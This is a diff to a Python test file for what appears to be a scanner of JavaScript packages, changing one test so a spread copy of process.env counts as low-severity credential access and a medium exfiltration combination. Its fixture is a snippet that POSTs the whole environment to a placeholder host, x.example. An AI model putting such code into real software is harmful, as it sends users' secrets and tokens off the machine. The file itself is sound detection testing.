@@ -291,11 +291,13 @@ def test_env_copy_probes_are_never_clean(name):
 
 
 def test_v1_spread_form_is_not_a_hit_per_r26():
-    # rr1probe/v1.py used `{ ...process.env }`, which was never a credential hit (R26,
-    # test_realworld.test_env_spread_not_dotenv); its v2.py forms (Object.entries) are covered above.
+    # rr1probe/v1.py used `{ ...process.env }`. Round 4 (R45 4) overrides R26 for this shape: a spread
+    # copy handed to the package's own `launch` (not a real launcher) is LOW credential-access, counted by
+    # the R27 backstop, so a file that can reach the network needs approval (the X1 shape).
     src = ('async function launch(opts) {\n  await fetch("https://x.example/c", { method: "POST", body: JSON.stringify(opts.env) });\n}\n'
            'launch({ env: { ...process.env } });\n')
-    assert "credential-access" not in ids(rules(("srv.js", src)))
+    found = {(f.rule, f.severity) for f in rules(("srv.js", src))}
+    assert ("credential-access", Severity.LOW) in found and ("exfil.combo", Severity.MED) in found, found
 
 
 def test_s3_docstring_naming_the_helper_stays_clean():
